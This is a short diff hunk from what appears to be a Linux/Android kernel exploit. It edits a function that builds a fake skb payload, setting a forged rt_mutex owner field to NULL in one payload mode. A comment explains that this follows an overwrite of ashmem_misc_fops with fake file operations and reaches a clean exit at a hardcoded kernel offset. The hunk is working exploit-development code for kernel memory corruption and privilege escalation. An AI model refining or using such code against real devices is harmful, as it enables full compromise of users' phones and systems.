@@ -692,8 +692,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
+      /* owner=1 (NULL owner + HAS_WAITERS): the dequeue rb_erase already did the
+       * *ashmem_misc_fops=fake_fops write; a NULL owner makes rt_mutex_adjust_prio_chain
+       * take the `owner<=1` clean-exit (0x1e8ca0) right after, skipping the fragile
+       * fake-owner boost / enqueue_pi / rt_mutex_setprio(fake_task) traversal. */
       put64(p, LOCK_OFF + 0x18,
-            slide_owner_null_shape ? 1 : (fake_task | 1));
+            (payload_mode == PAGE_PAYLOAD_FOPS || slide_owner_null_shape)
+                ? 1 : (fake_task | 1));
     }
 
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
